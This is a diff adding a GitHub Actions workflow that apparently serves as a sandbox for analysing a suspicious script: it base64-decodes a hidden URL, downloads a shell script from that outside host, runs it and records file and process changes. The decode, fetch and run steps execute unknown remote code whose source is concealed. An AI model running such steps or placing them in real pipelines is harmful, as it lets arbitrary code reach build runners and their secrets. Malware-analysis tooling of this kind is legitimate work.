@@ -1,0 +1,53 @@
+name: Dynamic Script Analysis
+
+on:
+  workflow_dispatch:
+
+jobs:
+  analyze:
+    runs-on: ubuntu-latest
+
+    timeout-minutes: 10
+
+    steps:
+      - name: Decode URL
+        run: |
+          URL=$(echo "aHR0cHM6Ly9zYXRpbjg3LmNvbS9jdXJsLzY2MjdmMDJhN2EzNzVlZjEyYmUxMzMwMThiZDIyY2Y5MTRmNWFjYWYxMDljODc4NmIwMjk3MGNhZjFhYWU5YWU=" | base64 -d)
+          echo "URL=$URL" >> $GITHUB_ENV
+
+      - name: Download
+        run: |
+          curl -L "$URL" -o script.sh
+          chmod +x script.sh
+
+      - name: Save baseline
+        run: |
+          find /home/runner -type f 2>/dev/null | sort > before-files.txt
+          ps aux > before-processes.txt
+
+      - name: Execute with timeout
+        continue-on-error: true
+        run: |
+          timeout 120 bash -x script.sh > runtime.log 2>&1
+
+      - name: Collect after state
+        run: |
+          find /home/runner -type f 2>/dev/null | sort > after-files.txt
+          ps aux > after-processes.txt
+
+      - name: Diff files
+        run: |
+          diff before-files.txt after-files.txt > file-diff.txt || true
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: analysis-results
+          path: |
+            script.sh
+            runtime.log
+            before-files.txt
+            after-files.txt
+            file-diff.txt
+            before-processes.txt
+            after-processes.txt
